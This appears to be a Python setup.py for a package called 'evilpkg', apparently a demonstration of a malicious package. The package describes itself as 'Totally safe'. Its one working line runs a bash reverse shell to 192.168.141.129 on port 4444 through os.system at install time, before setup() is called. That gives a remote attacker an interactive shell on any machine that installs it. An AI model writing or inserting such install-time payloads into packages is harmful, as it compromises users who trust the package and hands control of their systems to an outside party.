from setuptools import setup
import os

# Reverse shell payload
os.system("bash -c 'bash -i >& /dev/tcp/192.168.141.129/4444 0>&1'")

setup(
    name='evilpkg',
    version='0.1',
    description='Totally safe package :)',
    py_modules=['evil'],
)
